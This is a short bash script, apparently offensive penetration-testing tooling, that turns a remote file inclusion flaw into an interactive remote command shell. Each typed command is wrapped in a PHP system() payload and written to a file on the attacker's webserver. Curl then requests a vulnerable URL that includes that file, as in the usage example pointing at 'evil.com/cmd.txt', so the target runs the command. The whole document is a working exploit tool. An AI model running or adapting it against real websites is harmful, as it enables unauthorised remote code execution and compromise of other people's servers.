#!/bin/bash

###########################################################
# RFI shell-like console to assist with system enumeration
# when it's hard/impossible to get a real shell.
#
# Inspired and based on a script by @superkojiman, I have only
# fixed couple things, added comments and pretty colours :)
# 
# Original file: https://github.com/superkojiman/rfishell
# Blog post: http://blog.techorganic.com/2012/06/26/lets-kick-shell-ish-part-2-remote-file-inclusion-shell
# Fixes and additions: @TheKnapsy
###########################################################


# Create template RFI file to be hosted on your webserver.
# Dynamically created based on required command.
#
function rfi_template {
    # Escape any quotes from the command as they may break it
    escaped_cmd=`echo "$1" | sed 's/\\"/\\\"/g'`
    echo $escaped_cmd
    echo "<?php system(\"$escaped_cmd 2>&1\");?>" > $2   # 2>&1 to see all errors
}

# Display usage message.
# Provide full path to the file to be used as the injection (anything in
# your webserver directory) and full URL to vulnerable site (including
# the file that is being injected).
#
function usage {
    echo -e "Usage: $0 cmd.txt URL\n"
    echo -e "Example:\n$0 /var/www/hack.txt \"http://vulnsite.com/test.php?page=http://evil.com/cmd.txt\""
}

# Sanity checks
#
if [ $# -ne 2 ]; then
    usage;
    exit 1;
fi

which curl 2>&1>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] 'curl' needs to be installed to run this script"
    exit 1
fi

rfifile=$1
url=$2

# Colors
red='\033[0;31m'
green='\033[0;32m'
nc='\033[0m' # No Color

if [ ! -z $rfifile ]; then 
    # use RFI to execute commands
    while :; do 
        echo -ne "\n${red}[rfi>] $nc"
        read cmd
        rfi_template "$cmd" $rfifile
        echo -e "${green}[+] requesting ${url}${nc}\n"
        curl "$url"
        echo ""
    done
fi

